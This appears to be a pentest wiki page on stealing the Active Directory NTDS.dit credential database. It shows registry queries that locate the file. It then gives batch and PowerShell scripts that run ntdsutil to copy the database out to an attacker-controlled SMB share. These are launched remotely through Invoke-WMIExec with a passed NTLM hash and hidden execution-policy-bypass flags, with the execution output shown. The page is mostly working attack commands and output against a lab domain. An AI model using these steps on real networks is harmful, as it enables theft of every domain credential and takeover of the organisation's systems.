## Dump NTDS.dit file:

How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398

How-to-dump-windows2012-credentials: https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-dump-windows2012-credentials.md

Invoke-TheHash: https://github.com/Kevin-Robertson/Invoke-TheHash

### Find NTDS.dit file location using this command in CMD and Powershell
```
PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
    System Schema Version    REG_DWORD    0x38
    Root Domain    REG_SZ    DC=test,DC=local
    Configuration NC    REG_SZ    CN=Configuration,DC=test,DC=local
    Machine DN Name    REG_SZ    CN=NTDS Settings,CN=WIN-PJNUFB8U83P,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=test,DC=local
    DsaOptions    REG_SZ    1
    IsClone    REG_DWORD    0x0
    ServiceDll    REG_EXPAND_SZ    %systemroot%\system32\ntdsa.dll
    DSA Working Directory    REG_SZ    C:\Windows\NTDS
    DSA Database file    REG_SZ    C:\Windows\NTDS\ntds.dit
    Database backup path    REG_SZ    C:\Windows\NTDS\dsadata.bak
    Database log files path    REG_SZ    C:\Windows\NTDS
    Hierarchy Table Recalculation interval (minutes)    REG_DWORD    0x2d0
    Database logging/recovery    REG_SZ    ON
    DS Drive Mappings    REG_MULTI_SZ    c:\=\\?\Volume{7e3f7bcd-5ece-11e6-93e8-806e6f6e6963}\
    DSA Database Epoch    REG_DWORD    0x79fd
    Strict Replication Consistency    REG_DWORD    0x1
    Schema Version    REG_DWORD    0x38
    ldapserverintegrity    REG_DWORD    0x1
    Global Catalog Promotion Complete    REG_DWORD    0x1
   
PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters

System Schema Version                            : 56
Root Domain                                      : DC=test,DC=local
Configuration NC                                 : CN=Configuration,DC=test,DC=local
Machine DN Name                                  : CN=NTDS Settings,CN=WIN-PJNUFB8U83P,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=test,DC=local
DsaOptions                                       : 1
IsClone                                          : 0
ServiceDll                                       : C:\Windows\system32\ntdsa.dll
DSA Working Directory                            : C:\Windows\NTDS
DSA Database file                                : C:\Windows\NTDS\ntds.dit
Database backup path                             : C:\Windows\NTDS\dsadata.bak
Database log files path                          : C:\Windows\NTDS
Hierarchy Table Recalculation interval (minutes) : 720
Database logging/recovery                        : ON
DS Drive Mappings                                : {c:\=\\?\Volume{7e3f7bcd-5ece-11e6-93e8-806e6f6e6963}\}
DSA Database Epoch                               : 31229
Strict Replication Consistency                   : 1
Schema Version                                   : 56
ldapserverintegrity                              : 1
Global Catalog Promotion Complete                : 1
PSPath                                           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
PSParentPath                                     : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS
PSChildName                                      : Parameters
PSDrive                                          : HKLM
PSProvider                                       : Microsoft.PowerShell.Core\Registry
```

### Make sure `temp` folder in SMB share is writable and empty before NTDSUtil tries writing to it

### Using batch script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.bat 
ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "cmd /c \\192.168.136.128\kali_smb_share\exp.bat"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3116 on 192.168.136.130
```

### Using powershell script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.ps1 
$A = Invoke-Expression 'ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q' -ErrorVariable $B -WarningVariable $C -Verbose
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\out.log -InputObject $A -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\error.log -InputObject $B -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\warning.log -InputObject $C -Encoding ASCII

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "powershell -NoP -sta -NonI -W Hidden -Exec bypass -File \\192.168.136.128\kali_smb_share\exp.ps1"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3128 on 192.168.136.130
```
